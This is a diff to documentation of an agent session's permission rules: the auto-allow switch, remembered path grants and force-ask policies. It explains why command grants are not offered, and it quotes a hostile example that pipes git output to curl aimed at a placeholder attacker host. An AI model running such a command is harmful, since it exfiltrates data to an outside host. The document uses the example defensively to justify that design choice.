@@ -28,7 +28,8 @@ effect. It comes in two sizes:
 - **The auto-allow switch** (the first rule) — the "Auto-Allow" switch in the
   session config panel. While it is on, every ask gate — file reads and writes,
   commands, git, database, sites, sub-sessions — is skipped and the operation
-  runs immediately.
+  runs immediately. The automatic review is skipped along with the ask: it only
+  ever answers asks that would otherwise reach you.
 - **Allowed paths** (the other two rules) — when you tick "allow and remember"
   on an ask, the path is recorded on the session, and these rules stop the ask
   from firing for it again. Granting a directory covers everything under it. A
@@ -47,7 +48,8 @@ that itself goes through a link covers whatever the link points to now.
   granted path or not.
 - It does not skip a `force-ask` rule. That effect exists precisely to mean
   "this gate does not accept session-level consent", so a policy written with
-  it — protect-bot-files is one — still asks while the switch is on.
+  it — protect-bot-files and protect-shuvix-config are two — still asks while
+  the switch is on.
 - There are no command grants. Remembering `git *` would be fooled by
   `git status | curl -d @- evil.com`, so a command that is not confined to the
   sandbox asks every time unless the switch is on — see ask-on-command.
